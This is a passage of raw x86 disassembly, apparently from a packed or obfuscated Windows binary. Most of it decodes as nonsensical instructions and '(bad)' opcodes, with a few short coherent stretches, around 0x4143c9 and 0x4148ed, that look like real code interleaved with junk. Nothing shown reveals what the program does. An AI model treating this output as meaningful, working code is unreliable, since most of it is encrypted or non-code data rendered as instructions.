  41431f:	add    bh,dl
  414321:	sar    DWORD PTR [ebx-0x63],0x20
  414325:	int3   
  414326:	dec    eax
  414327:	bound  ebx,QWORD PTR [ecx]
  414329:	scas   eax,DWORD PTR es:[edi]
  41432a:	pop    ecx
  41432b:	repz aas 
  41432d:	(bad)  
  41432e:	cld    
  41432f:	mov    ch,0xb
  414331:	push   ss
  414332:	cli    
  414333:	loop   0x414364
  414335:	push   ds
  414336:	loopne 0x4142df
  414338:	jne    0x414319
  41433a:	push   esi
  41433b:	pop    es
  41433c:	xor    DWORD PTR [edx-0x4f],ebp
  41433f:	pop    esp
  414340:	push   0x32
  414342:	cs cmc 
  414344:	xchg   al,dh
  414346:	push   0x33
  414348:	dec    ebx
  414349:	or     eax,0x6d482cdb
  41434e:	dec    edi
  41434f:	mov    eax,edi
  414351:	leave  
  414352:	xchg   ebp,eax
  414353:	push   ebp
  414354:	xchg   BYTE PTR [eax+0x59],ch
  414357:	imul   edi,DWORD PTR [edi+ecx*2+0x16],0x11
  41435c:	leave  
  41435d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41435e:	aad    0x0
  414360:	mov    al,0x64
  414362:	cmp    al,0x4c
  414364:	popf   
  414365:	dec    eax
  414366:	scas   al,BYTE PTR es:[edi]
  414367:	cmc    
  414368:	shl    DWORD PTR [ebp+0x13a33f40],1
  41436e:	repz pop es
  414370:	sub    ebx,edi
  414372:	adc    al,0x1c
  414374:	sahf   
  414375:	push   esp
  414376:	adc    BYTE PTR [esi-0x19],bl
  414379:	mov    eax,ds:0x7d202692
  41437e:	aam    0x31
  414380:	ins    BYTE PTR es:[edi],dx
  414381:	cmp    al,0xfe
  414383:	mov    esi,0xd28e95e4
  414388:	test   BYTE PTR [ebp+0x563234e4],dh
  41438e:	sbb    BYTE PTR gs:[edi-0x7b430624],ch
  414395:	adc    edx,edi
  414397:	mov    cs,WORD PTR [ebp+0x4721843c]
  41439d:	push   0x109273ef
  4143a2:	fs es xor al,0x57
  4143a6:	push   ss
  4143a7:	fdivr  DWORD PTR [esi+0x5fbfafc]
  4143ad:	loope  0x41440c
  4143af:	lods   al,BYTE PTR ds:[esi]
  4143b0:	shr    eax,1
  4143b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143b4:	iret   
  4143b5:	mov    ds:0xd12be046,al
  4143ba:	lea    edi,[edi+ebx*1+0x327298]
  4143c1:	cmp    edi,edx
  4143c3:	jbe    0x4129d7
  4143c9:	mov    edx,DWORD PTR [ebp-0xc]
  4143cc:	mov    edi,DWORD PTR [ebp-0x24]
  4143cf:	xor    edx,eax
  4143d1:	add    edx,ecx
  4143d3:	jmp    0x41465b
  4143d8:	(bad)
  4143db:	rcr    bl,1
  4143dd:	fcmovb st,st(5)
  4143df:	rol    DWORD PTR [ebx-0x7f],1
  4143e2:	add    ecx,ebp
  4143e4:	add    eax,0xc1e3d27d
  4143e9:	or     DWORD PTR [edi+0x78],edi
  4143ec:	in     eax,0x7e
  4143ee:	js     0x414468
  4143f0:	xchg   esi,eax
  4143f1:	jnp    0x41438f
  4143f3:	mov    bl,0x79
  4143f5:	stos   DWORD PTR es:[edi],eax
  4143f6:	inc    esp
  4143f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143f8:	(bad)  
  4143f9:	cli    
  4143fa:	mov    ch,0xae
  4143fc:	push   0xcec54862
  414401:	adc    ch,BYTE PTR [eax+ebp*4+0x1aaf7cdc]
  414408:	mov    ecx,0x885f3928
  41440d:	and    BYTE PTR [esi+0x1414b0e],cl
  414413:	nop
  414414:	bound  ecx,QWORD PTR [esi]
  414416:	mov    ebx,0xd71035b
  41441b:	pop    esi
  41441c:	or     eax,0x88510afd
  414421:	add    eax,0x98d7874
  414426:	mov    edx,0xc83ea4dd
  41442b:	fs mov al,es:0x2ccb8eab
  414432:	shl    ah,1
  414434:	jle    0x4143b6
  414436:	dec    ecx
  414437:	shl    BYTE PTR [eax],0xc5
  41443a:	or     DWORD PTR ds:0xc274d346,esi
  414440:	mov    bh,0xf6
  414442:	jne    0x414432
  414444:	mov    esp,0xbd1dd2cf
  414449:	inc    esp
  41444a:	sbb    al,0x6e
  41444c:	and    edx,DWORD PTR [ecx]
  41444e:	mov    ebp,0x3af1c5f6
  414453:	dec    edi
  414454:	enter  0x3530,0x58
  414458:	inc    edx
  414459:	je     0x4143e0
  41445b:	pop    esi
  41445c:	xor    al,BYTE PTR [ecx]
  41445e:	xchg   BYTE PTR [ecx+0x66],al
  414461:	call   0xc25b4ba9
  414466:	and    al,0xde
  414468:	scas   al,BYTE PTR es:[edi]
  414469:	sahf   
  41446a:	in     al,0xcb
  41446c:	push   es
  41446d:	ds (bad) 
  41446f:	ja     0x414479
  414471:	push   cs
  414472:	sub    edi,DWORD PTR [esi-0x2e]
  414475:	div    DWORD PTR [esi+0x7c42865a]
  41447b:	xor    al,0x0
  41447d:	add    al,0x74
  41447f:	(bad)
  414482:	dec    eax
  414483:	sub    esi,DWORD PTR [ebp+0x63a34411]
  414489:	push   0x96524f47
  41448e:	add    eax,0xbfd824ba
  414493:	in     al,dx
  414494:	add    eax,0xf713f23c
  414499:	or     edx,DWORD PTR [ecx]
  41449b:	push   ebx
  41449c:	stc    
  41449d:	shl    DWORD PTR [eax+ebp*8],cl
  4144a0:	loop   0x414508
  4144a2:	mov    esi,edx
  4144a4:	xor    BYTE PTR [ecx-0x4e],ah
  4144a7:	stc    
  4144a8:	je     0x41446c
  4144aa:	push   es
  4144ab:	pop    ebx
  4144ac:	std    
  4144ad:	imul   esp,DWORD PTR [ebp+0x4cfbbe23],0x57cf91b4
  4144b7:	and    ebx,DWORD PTR [ecx-0x7273c7a4]
  4144bd:	adc    al,0xb5
  4144bf:	inc    ecx
  4144c0:	das    
  4144c1:	repz jge 0x4144e2
  4144c4:	mov    eax,ds:0xe6799828
  4144c9:	inc    esi
  4144ca:	xlat   BYTE PTR ds:[ebx]
  4144cb:	mov    BYTE PTR [eax],bh
  4144cd:	out    dx,al
  4144ce:	jl     0x41454a
  4144d0:	and    edi,DWORD PTR [esi-0x5329ceca]
  4144d6:	inc    eax
  4144d7:	jnp    0x414520
  4144d9:	pop    es
  4144da:	fiadd  WORD PTR [ebp+0x0]
  4144dd:	movntq QWORD PTR [edx],mm2
  4144e0:	mov    al,ds:0xca683335
  4144e5:	adc    eax,0x177bbb30
  4144ea:	imul   ebx,DWORD PTR [ebp+0x1a6eb3ca],0x6d431527
  4144f4:	adc    eax,0xfe626e3b
  4144f9:	push   ds
  4144fa:	jne    0x414529
  4144fc:	pop    es
  4144fd:	jg     0x41455e
  4144ff:	enter  0xd231,0xd6
  414503:	pop    ebp
  414504:	aaa    
  414505:	pop    esp
  414506:	push   esp
  414507:	mov    ah,0xae
  414509:	cmp    BYTE PTR [eax],ah
  41450b:	fcom   DWORD PTR [eax+0x33]
  41450e:	popf   
  41450f:	test   eax,ecx
  414511:	shl    DWORD PTR [edx],1
  414513:	mov    edx,0x620bb4ee
  414518:	lock dec edx
  41451a:	loope  0x414548
  41451c:	dec    esp
  41451d:	test   BYTE PTR [esi],0x44
  414520:	and    al,0x97
  414522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414523:	xchg   ebx,eax
  414524:	pusha  
  414525:	mov    DWORD PTR [edi-0x5d],edi
  414528:	xchg   edi,eax
  414529:	jmp    0x8364:0x8f7fa0ca
  414530:	jne    0x4144cc
  414532:	sar    ah,1
  414534:	jmp    0xc573:0xc1cebba2
  41453b:	aaa    
  41453c:	jmp    edi
  41453e:	mov    al,0xc8
  414540:	(bad)  
  414541:	mov    eax,ds:0xed18584a
  414546:	adc    al,0x23
  414548:	mov    ecx,0x4b4edb20
  41454d:	xchg   esp,eax
  41454e:	rol    DWORD PTR [edi-0x2ba6b41b],cl
  414554:	push   DWORD PTR [ecx-0x7e]
  414557:	adc    al,0x13
  414559:	dec    DWORD PTR [ecx+0xd]
  41455c:	inc    ebp
  41455d:	xchg   dh,dh
  41455f:	outs   dx,BYTE PTR ds:[esi]
  414560:	mov    edx,ebx
  414562:	mov    ebp,0xe0f3db69
  414567:	fadd   DWORD PTR [ebx+0x17fc4cf]
  41456d:	inc    ebp
  41456e:	mov    DWORD PTR [ebx],esp
  414570:	(bad)
  414573:	lahf   
  414574:	cmp    al,0xe2
  414576:	jnp    0x4145c3
  414578:	mov    ebp,0xd2f008cd
  41457d:	std    
  41457e:	out    0x34,eax
  414580:	inc    edi
  414581:	mov    ?,WORD PTR [edx+edx*4-0x6f307b0c]
  414588:	mov    ecx,0x207674c2
  41458d:	mov    edi,0xe81a7137
  414592:	fcomp  st(1)
  414594:	(bad)  
  414595:	mov    esp,0x85bed79b
  41459a:	xor    esp,DWORD PTR [eax-0x4a57955d]
  4145a0:	jnp    0x4145d9
  4145a2:	mov    gs,WORD PTR [ebx-0x5232942a]
  4145a8:	mov    esp,0x6a32c4dd
  4145ad:	pusha  
  4145ae:	mov    ds:0xd2d08e8c,al
  4145b3:	mov    eax,ds:0x8c2d75f9
  4145b8:	(bad)  
  4145b9:	adc    al,0x61
  4145bb:	call   0xb564:0xaf82754d
  4145c2:	jae    0x414641
  4145c4:	xor    eax,0xb1f38433
  4145c9:	push   ebx
  4145ca:	cmp    eax,0x294fef7a
  4145cf:	iret   
  4145d0:	jae    0x41459e
  4145d2:	mov    edi,0x83d1907d
  4145d7:	xor    ecx,0x455f85a8
  4145dd:	outs   dx,DWORD PTR ds:[esi]
  4145de:	retf   0xf3c0
  4145e1:	jae    0x414572
  4145e3:	push   ebx
  4145e4:	fistp  WORD PTR [edi]
  4145e6:	mov    cl,ah
  4145e8:	das    
  4145e9:	(bad)  
  4145ea:	or     al,0x4a
  4145ec:	ins    BYTE PTR es:[edi],dx
  4145ed:	xchg   edi,eax
  4145ee:	push   es
  4145ef:	rol    BYTE PTR ss:[ebp+0x18192b46],1
  4145f6:	dec    edi
  4145f7:	jae    0x414628
  4145f9:	mov    eax,ds:0x7691cc22
  4145fe:	jge    0x4145f8
  414600:	pop    ebp
  414601:	test   ch,0xd4
  414604:	jb     0x8653a8a0
  41460a:	mov    ebx,0xb0765895
  41460f:	adc    BYTE PTR [ebp+eiz*2+0x38],al
  414613:	test   al,0xc9
  414615:	stos   BYTE PTR es:[edi],al
  414616:	imul   edx,eax,0xffffffe4
  414619:	dec    eax
  41461a:	fidivr DWORD PTR [ebp-0x3afe9c5a]
  414620:	lahf   
  414621:	rcr    BYTE PTR [esi],1
  414623:	xor    ebx,esp
  414625:	fwait
  414626:	call   0x7444:0x946b8d58
  41462d:	jne    0x41462c
  41462f:	jbe    0x4145d1
  414631:	sbb    DWORD PTR [edx+0x1c],ecx
  414634:	jecxz  0x414654
  414636:	sub    ebx,esi
  414638:	fcomp  DWORD PTR [edx-0x6217f5f1]
  41463e:	mov    esi,0xa1b398cb
  414643:	xchg   edx,eax
  414644:	out    dx,eax
  414645:	rcl    DWORD PTR [edx+0x7b],1
  414648:	nop
  414649:	arpl   si,cx
  41464b:	sub    eax,0x73870581
  414650:	mov    esi,0x89c4020c
  414655:	xor    BYTE PTR [ebx],ch
  414657:	jp     0x41467b
  414659:	fbld   TBYTE PTR [esi-0x742850f1]
  41465f:	jge    0x414649
  414661:	jmp    0x4148e9
  414666:	retf   
  414667:	ret    0xd23d
  41466a:	vpand  xmm3,xmm5,xmm1
  41466e:	ret    0xb492
  414671:	add    ah,0xce
  414674:	test   bl,bl
  414676:	scas   al,BYTE PTR es:[edi]
  414677:	movq   QWORD PTR [eax-0x1b],mm7
  41467b:	jle    0x4146f5
  41467d:	js     0x414647
  41467f:	rcl    bl,1
  414681:	push   ecx
  414682:	push   edx
  414683:	xor    edx,DWORD PTR [ebx-0x7d]
  414686:	hlt    
  414687:	imul   ebx,DWORD PTR [esi],0x7a
  41468a:	or     eax,0x8144f6de
  41468f:	ins    BYTE PTR es:[edi],dx
  414690:	inc    ecx
  414691:	sub    DWORD PTR [esi+edx*2+0x53],esp
  414695:	mov    dl,0xf2
  414697:	and    edx,eax
  414699:	ret    0xac5f
  41469c:	xor    eax,0xbc2d74fa
  4146a1:	dec    esp
  4146a2:	jb     0x4146bb
  4146a4:	xor    eax,0xd2e818f3
  4146a9:	mov    eax,ds:0x4aabadbb
  4146ae:	jge    0x41465a
  4146b0:	xchg   ebx,eax
  4146b1:	in     al,dx
  4146b2:	pop    ss
  4146b3:	jo     0x41471d
  4146b5:	scas   al,BYTE PTR es:[edi]
  4146b6:	mov    edi,0xf2bc17f8
  4146bb:	add    DWORD PTR [edx],ebp
  4146bd:	shl    BYTE PTR [ecx],1
  4146bf:	adc    dl,BYTE PTR [ebp-0x3a]
  4146c2:	xlat   BYTE PTR ds:[ebx]
  4146c3:	add    BYTE PTR [ebx],ch
  4146c5:	xor    edx,DWORD PTR [edx]
  4146c7:	fst    QWORD PTR [ebx-0x7a]
  4146ca:	cmc    
  4146cb:	xor    DWORD PTR [esi],ebx
  4146cd:	fstp   TBYTE PTR [ebp+edx*4-0x7ce675fd]
  4146d4:	nop
  4146d5:	jle    0x4146f1
  4146d7:	pop    ebx
  4146d8:	int    0x31
  4146da:	sbb    eax,0xb850cfa7
  4146df:	in     eax,dx
  4146e0:	test   BYTE PTR [ecx+0x26],cl
  4146e3:	ret    
  4146e4:	sub    eax,0x626d1d37
  4146e9:	mov    cs,WORD PTR [ebx+0x1266cfeb]
  4146ef:	mov    ?,esi
  4146f1:	outs   dx,BYTE PTR ds:[esi]
  4146f2:	or     edi,DWORD PTR [ecx+0x1406076]
  4146f8:	mov    ecx,0x42f9ac88
  4146fd:	not    DWORD PTR [eax]
  4146ff:	or     BYTE PTR [esi-0x2f5e5099],cl
  414705:	stos   DWORD PTR es:[edi],eax
  414706:	pop    ebx
  414707:	mov    bh,BYTE PTR [edx-0x48f00b43]
  41470d:	fnstenv [edx-0x7a15e775]
  414713:	and    eax,0x8c572953
  414718:	xchg   BYTE PTR [edx],ch
  41471a:	dec    edi
  41471b:	ret    
  41471c:	mov    DWORD PTR [ebx],ebp
  41471e:	sub    eax,0xbf895c02
  414723:	push   cs
  414724:	sub    al,0x95
  414726:	cmp    edi,DWORD PTR [ebx+0x15]
  414729:	sub    eax,0x74456b36
  41472e:	adc    al,0x86
  414730:	fnstenv [edi+0x5f6f8bfe]
  414736:	shl    DWORD PTR [eax],1
  414738:	aas    
  414739:	dec    ebx
  41473a:	push   ebx
  41473b:	retf   0x3f2f
  41473e:	mov    cl,0x80
  414740:	ds scas al,BYTE PTR es:[edi]
  414742:	paddw  mm5,mm7
  414745:	cmp    eax,0xba9f7a8
  41474a:	data16 adc al,BYTE PTR [esi+0x76]
  41474e:	out    0x43,eax
  414750:	adc    BYTE PTR [ebp+0x22],cl
  414753:	mov    edx,?
  414755:	jg     0x41473e
  414757:	mov    ah,0x41
  414759:	bound  edx,QWORD PTR ds:0x5a58d76e
  41475f:	pop    es
  414760:	or     BYTE PTR [edx],ah
  414762:	into   
  414763:	xchg   ah,al
  414765:	sub    bh,BYTE PTR [ecx-0x5]
  414768:	xchg   edx,eax
  414769:	cmp    al,0x98
  41476b:	xor    DWORD PTR [esi+0xafa08cb],ebp
  414771:	aam    0x7d
  414773:	sub    al,0x62
  414775:	or     esi,DWORD PTR [esi-0x6b]
  414778:	add    eax,0x7f5d1229
  41477d:	les    ebp,FWORD PTR [ecx+0x15]
  414780:	or     ebp,DWORD PTR [eax]
  414782:	or     al,0x6f
  414784:	lods   ax,WORD PTR cs:[esi]
  414787:	add    al,0xc7
  414789:	xchg   ebp,eax
  41478a:	xor    al,BYTE PTR [edx-0x467f1892]
  414790:	xor    cl,BYTE PTR [eax+0xd18451b]
  414796:	bound  edx,QWORD PTR ds:0xb190f00f
  41479c:	mov    gs,WORD PTR [edi]
  41479e:	(bad)  
  41479f:	jecxz  0x41473b
  4147a1:	jge    0x41473a
  4147a3:	fbld   TBYTE PTR [edx+0x19]
  4147a6:	outs   dx,DWORD PTR ds:[esi]
  4147a7:	imul   esp,DWORD PTR [ebp+0x6b],0xffffff94
  4147ab:	adc    ebp,esp
  4147ad:	clc    
  4147ae:	add    BYTE PTR [ecx+0x133becc2],al
  4147b4:	xor    eax,0xa30f9692
  4147b9:	pop    ebp
  4147ba:	out    dx,al
  4147bb:	mov    ch,0x9c
  4147bd:	cli    
  4147be:	hlt    
  4147bf:	inc    edi
  4147c0:	push   ebp
  4147c1:	ins    DWORD PTR es:[edi],dx
  4147c2:	adc    ebp,DWORD PTR [edx]
  4147c4:	xchg   esp,eax
  4147c5:	das    
  4147c6:	jge    0x414793
  4147c8:	and    DWORD PTR [esi],0x725137e2
  4147ce:	inc    esp
  4147cf:	push   edx
  4147d0:	mov    esp,0xc75a99f5
  4147d5:	pop    es
  4147d6:	push   edi
  4147d7:	and    BYTE PTR [ecx],ah
  4147d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147da:	in     al,dx
  4147db:	jg     0x4147e6
  4147dd:	outs   dx,BYTE PTR ds:[esi]
  4147de:	fwait
  4147df:	pop    es
  4147e0:	xor    eax,0x71d090ad
  4147e5:	std    
  4147e6:	ret    0xde68
  4147e9:	mov    eax,0x17a1b875
  4147ee:	mov    eax,0xa87f3855
  4147f3:	jp     0x414840
  4147f5:	out    0x3e,al
  4147f7:	mov    esi,0xe7dc2bca
  4147fc:	push   edx
  4147fd:	mov    bh,0x8f
  4147ff:	pusha  
  414800:	sub    ecx,DWORD PTR [ebp+0x615fee64]
  414806:	out    0xff,eax
  414808:	pop    ss
  414809:	jle    0x414834
  41480b:	mov    bl,0x4d
  41480d:	mov    WORD PTR [edi+0x2bb00c4c],?
  414813:	jae    0x4147b7
  414815:	iret   
  414816:	xor    al,0x64
  414818:	jge    0x41488c
  41481a:	pop    ebx
  41481b:	xchg   edx,eax
  41481c:	fsub   st(7),st
  41481e:	mov    al,0x6d
  414820:	call   0x7a7ddf9c
  414825:	xchg   DWORD PTR [esi-0x60],esp
  414828:	dec    ebx
  414829:	popa   
  41482a:	inc    ecx
  41482b:	imul   edx,ecx,0x39
  41482e:	mov    WORD PTR [ebx+ebx*4+0x563866b0],es
  414835:	or     al,0x6a
  414837:	test   eax,esi
  414839:	ror    eax,1
  41483b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41483c:	jl     0x4147e4
  41483e:	jmp    0xf05c28ce
  414843:	xlat   BYTE PTR ds:[ebx]
  414844:	stc    
  414845:	dec    edx
  414846:	push   ebx
  414847:	arpl   WORD PTR fs:[eax+edi*4],bx
  41484b:	xchg   esp,eax
  41484c:	mov    al,ds:0xca609bf9
  414851:	or     ecx,esp
  414853:	pmaxub mm1,QWORD PTR [ebx+0x2e9d745c]
  41485a:	cli    
  41485b:	loop   0x414881
  41485d:	push   edx
  41485e:	in     al,dx
  41485f:	in     al,dx
  414860:	sbb    DWORD PTR [esi],esp
  414862:	shrd   DWORD PTR [eax+0x1b],ebp,cl
  414866:	clc    
  414867:	mov    ebp,0x63f860de
  41486c:	pushf  
  41486d:	sbb    edi,DWORD PTR [ecx]
  41486f:	ins    DWORD PTR es:[edi],dx
  414870:	mov    cl,0x78
  414872:	jg     0x41482e
  414874:	sbb    al,0x3
  414876:	add    DWORD PTR [ebx],edi
  414878:	in     al,dx
  414879:	mov    eax,ds:0x3faf49d3
  41487e:	add    ecx,edx
  414880:	mov    esi,0x8508622a
  414885:	adc    eax,0xc90b20fe
  41488a:	jo     0x41484b
  41488c:	gs xchg esp,eax
  41488e:	pushf  
  41488f:	mov    ebp,0x105fbb98
  414894:	sbb    al,0x9e
  414896:	mov    ?,WORD PTR [edi-0x1f937692]
  41489c:	mov    eax,0xc4761c5a
  4148a1:	jne    0x41487d
  4148a3:	out    0x72,al
  4148a5:	lea    ecx,[edi]
  4148a7:	mov    BYTE PTR [eax],al
  4148a9:	das    
  4148aa:	adc    eax,0xf3c5e69a
  4148af:	xchg   ebx,eax
  4148b0:	imul   esp,DWORD PTR [esp+ecx*4-0x72],0xffffffa9
  4148b5:	xor    BYTE PTR ss:[ebp-0x798a43ed],ah
  4148bc:	push   DWORD PTR [edi-0x54]
  4148bf:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148c1:	(bad)  
  4148c2:	retf   0x89c
  4148c5:	mov    ebp,ds
  4148c7:	jns    0x4148de
  4148c9:	(bad)  
  4148cb:	xor    BYTE PTR [ebx+0x7a],0x72
  4148cf:	in     al,dx
  4148d0:	cld    
  4148d1:	push   cs
  4148d2:	dec    esp
  4148d3:	cmp    cl,bl
  4148d5:	adc    ch,BYTE PTR [edx]
  4148d7:	test   eax,0xaa85864
  4148dc:	xchg   ebp,eax
  4148dd:	dec    edi
  4148de:	inc    ebp
  4148df:	or     al,0xb6
  4148e1:	cmc    
  4148e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148e3:	test   eax,0xdf50d51e
  4148e8:	dec    esi
  4148e9:	xor    edi,eax
  4148eb:	add    edx,edi
  4148ed:	mov    edi,DWORD PTR [ebp-0x8]
  4148f0:	lea    edx,[edx+edi*1+0x327298]
  4148f7:	mov    DWORD PTR [ebp-0x8],edx
  4148fa:	mov    edx,DWORD PTR [ebp-0x20]
  4148fd:	xor    edx,eax
  4148ff:	mov    edi,0xffcd8d68
  414904:	sub    edi,edx
  414906:	add    edi,DWORD PTR [ebp-0x10]
  414909:	mov    edx,DWORD PTR [ebp-0x20]
  41490c:	mov    ebx,DWORD PTR [ebp-0x8]
  41490f:	jmp    0x414b97
  414914:	rcl    bh,0xc5
  414917:	(bad)  
  414918:	aad    0xda
  41491a:	leave  
  41491b:	(bad)  [eax-0x27d87ab5]
  414921:	(bad)  
  414922:	fcom   DWORD PTR ds:0x787f0c1b
  414928:	in     eax,0x7e
  41492a:	js     0x4149a4
  41492c:	jp     0x41498c
  41492e:	data16 (bad) 
  414930:	repz popa 
  414932:	lds    edx,FWORD PTR [edi]
  414934:	into   
  414935:	fsubr  DWORD PTR [edi+0x1e806a63]
  41493b:	xchg   BYTE PTR [ebx+ecx*2],dl
  41493e:	mov    DWORD PTR [esi-0xa],edi
  414941:	dec    ecx
  414942:	push   esp
  414943:	ror    DWORD PTR [edi],cl
  414945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414946:	and    eax,0xafdd231e
  41494b:	mov    esi,0x9be97e6f
  414950:	xor    al,0x3
  414952:	add    DWORD PTR [ecx],eax
  414954:	dec    ecx
  414955:	jae    0x41492a
  414957:	ja     0x414959
  414959:	hlt    
  41495a:	mov    bl,0x61
  41495c:	ds scas al,BYTE PTR es:[edi]
  41495e:	das    
  41495f:	mov    edx,0x57b076f6
  414964:	mov    WORD PTR [ebx-0x603f1681],?
  41496a:	mov    esp,0xce2ddb59
  41496f:	push   esp
  414970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414971:	cs xchg ebx,eax
  414973:	ds popa 
  414975:	and    ah,dl
  414977:	test   eax,0x5ffa1442
  41497c:	push   0xd54c2a8a
  414981:	lds    eax,FWORD PTR [ecx-0x60cffae]
  414987:	stos   BYTE PTR es:[edi],al
  414988:	hlt    
  414989:	stos   DWORD PTR es:[edi],eax
  41498a:	push   ebp
  41498b:	sbb    eax,0xe5a1fcae
  414990:	enter  0xfa43,0x47
  414994:	imul   ebp,DWORD PTR ds:0x2967d219,0xfffffff7
  41499b:	mov    eax,0x2d1a7a64
  4149a0:	shl    BYTE PTR [esp+eiz*8-0x45],0x74
  4149a5:	and    BYTE PTR [edx+edx*1-0x7989ba7c],ch
  4149ac:	shl    BYTE PTR [esp+ecx*2],cl
  4149af:	and    eax,0x20e974b0
  4149b4:	sbb    al,0xf6
  4149b6:	test   BYTE PTR [eax+ebp*4-0x2cd3f74],al
  4149bd:	icebp  
  4149be:	push   0x6f2a66ce
  4149c3:	xor    DWORD PTR [edi],ebp
  4149c5:	inc    esi
  4149c6:	push   esp
  4149c7:	or     ch,bl
  4149c9:	in     eax,0x36
  4149cb:	or     ch,al
  4149cd:	adc    al,0xc5
  4149cf:	push   edi
  4149d0:	fiadd  DWORD PTR [eax]
  4149d2:	jns    0x4149c1
  4149d4:	jmp    0x414993
  4149d6:	lods   al,BYTE PTR ds:[esi]
  4149d7:	dec    ebp
  4149d8:	aaa    
  4149d9:	push   cs
  4149da:	mov    al,0x81
  4149dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149dd:	pop    ds
  4149de:	mov    cl,ch
  4149e0:	retf   
  4149e1:	add    ch,0x24
  4149e4:	and    BYTE PTR [ebx-0x19ddc361],bh
  4149ea:	mov    BYTE PTR [ebx-0x9],cl
  4149ed:	das    
  4149ee:	cdq    
  4149ef:	sub    al,0xe5
  4149f1:	dec    ecx
  4149f2:	test   BYTE PTR [ebx+0x22],cl
  4149f5:	mul    esi
  4149f7:	xchg   BYTE PTR [ebp+0x3e],bh
  4149fa:	push   ecx
  4149fb:	stos   DWORD PTR es:[edi],eax
  4149fc:	mov    dh,BYTE PTR [ebx+0x792eaca8]
  414a02:	add    al,0x84
  414a04:	in     al,0xba
  414a06:	out    0x8d,al
  414a08:	lock (bad) 
  414a0b:	xchg   edi,eax
  414a0d:	int    0x6c
  414a0f:	push   esi
  414a10:	jl     0x4149fb
  414a12:	or     al,0x5d
  414a14:	test   eax,0x23f061e8
  414a19:	adc    esi,DWORD PTR [eax-0x53]
  414a1c:	ja     0x4149d0
  414a1e:	mov    eax,ds:0x53a0b7ce
  414a23:	hlt    
  414a24:	fcomp  QWORD PTR ds:0xb8e9aad8
  414a2a:	dec    ebx
  414a2b:	scas   eax,DWORD PTR es:[edi]
  414a2c:	mov    ecx,0x81886804
  414a31:	mov    ebx,0x4fd79d6d
  414a36:	dec    ebp
  414a37:	mov    BYTE PTR [edx-0x672c5179],al
  414a3d:	push   eax
  414a3e:	pop    esp
  414a3f:	jae    0x414a64
  414a41:	mov    al,ds:0x2fc760dc
  414a46:	loop   0x414a1f
  414a48:	call   0xa985:0x265dcf66
  414a4f:	push   ebx
  414a50:	jge    0x414a80
  414a52:	push   es
  414a53:	fadd   QWORD PTR [ecx+0x7d]
  414a56:	add    al,0x3c
  414a58:	sub    dl,BYTE PTR [edx]
  414a5a:	leave  
  414a5b:	or     al,0x80
  414a5d:	or     ah,dh
  414a5f:	mov    esi,0x1be135c2
  414a64:	mov    edx,0x2f37ec53
  414a69:	out    0xd1,eax
  414a6b:	ss xor al,0x24
  414a6e:	dec    esi
  414a6f:	dec    ebp
  414a70:	jg     0x414a84
  414a72:	jp     0x414a6e
  414a74:	cmp    eax,0x655f3873
  414a79:	add    dh,BYTE PTR [edi+0x4f]
  414a7c:	mov    bl,dh
  414a7e:	das    
  414a7f:	daa    
  414a80:	lods   eax,DWORD PTR ds:[esi]
  414a81:	dec    ecx
  414a82:	addr16 out dx,al
  414a84:	xchg   esp,eax
  414a85:	mov    ch,0x3d
  414a87:	jmp    0x99ba:0x3da7fa5
  414a8e:	nop
  414a8f:	scas   eax,DWORD PTR es:[edi]
  414a90:	ret    
  414a91:	mov    edi,0xca08177d
  414a96:	in     al,dx
  414a97:	fsubr  QWORD PTR [ecx-0x32]
  414a9a:	outs   dx,DWORD PTR ds:[esi]
  414a9b:	nop
  414a9c:	in     eax,0xdb
  414a9e:	aaa    
  414a9f:	enter  0xeee0,0x42
  414aa3:	retf   
  414aa4:	or     BYTE PTR [ecx],al
  414aa6:	dec    ecx
  414aa7:	add    eax,0x67e17182
  414aac:	add    DWORD PTR [ebp+esi*4-0x50],ebp
  414ab0:	or     dl,BYTE PTR [eax-0x7af21577]
  414ab6:	test   al,0xa8
  414ab8:	or     ebx,DWORD PTR [edi+0x73]
  414abb:	and    edx,DWORD PTR [ebx]
  414abd:	adc    BYTE PTR [ecx],dl
  414abf:	xchg   ecx,edx
  414ac1:	enter  0xd2f5,0x5d
  414ac5:	or     eax,0x26d27b84
  414aca:	pop    esi
  414acb:	lds    ecx,FWORD PTR [esi]
  414acd:	mov    esp,0x38ef8d40
  414ad2:	nop
  414ad3:	fnsave [edx+eax*2-0x7cfda8c4]
  414ada:	call   0x8132:0x45aa4cda
  414ae1:	or     al,0x54
  414ae3:	out    dx,al
  414ae4:	mov    al,ds:0xc16113b1
  414ae9:	dec    esi
  414aea:	pop    ebp
  414aeb:	push   ebx
  414aec:	loope  0x414aca
  414aee:	out    dx,eax
  414aef:	jne    0x414af2
  414af1:	or     eax,0xc0383a12
  414af6:	mov    bl,0x61
  414af8:	mov    ebp,DWORD PTR [edi]
  414afa:	ins    BYTE PTR es:[edi],dx
  414afb:	repnz aas 
  414afd:	popf   
  414afe:	or     edx,ebp
  414b00:	add    al,0xa
  414b02:	out    0xb9,eax
  414b04:	loop   0x414b20
  414b06:	retf   
  414b07:	cmp    bh,bh
  414b09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b0a:	mov    DWORD PTR [ebp+0x19a831cb],0x10b218f7
  414b14:	mov    bh,0xcc
  414b16:	jecxz  0x414ae3
  414b18:	push   edx
  414b19:	fsub   QWORD PTR [ecx+ebp*2-0x31]
  414b1d:	pop    ecx
  414b1e:	cmp    al,BYTE PTR [ebp+0x1d150ea]
  414b24:	jae    0x414ba1
  414b26:	loope  0x414b08
  414b28:	cmp    al,0xf
  414b2a:	in     al,0xaa
  414b2c:	jno    0x414b19
  414b2e:	sub    DWORD PTR [eax-0x69571f35],0x5879f90c
  414b38:	push   0x499417cc
  414b3d:	outs   dx,DWORD PTR ds:[esi]
  414b3e:	adc    BYTE PTR [ebx-0x3857c594],bh
  414b44:	or     eax,0x59
  414b47:	pushf  
